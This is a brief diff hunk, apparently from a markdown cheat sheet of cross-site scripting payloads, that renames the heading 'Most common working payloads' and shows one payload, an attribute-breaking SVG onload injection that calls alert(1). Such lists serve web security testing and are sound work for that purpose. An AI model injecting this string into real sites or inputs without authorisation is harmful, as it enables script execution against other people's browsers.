@@ -1,4 +1,4 @@
-# Most common working payloads for me
+# Most common working payloads
 
 ```html
 "><svg/onload=alert(1)>
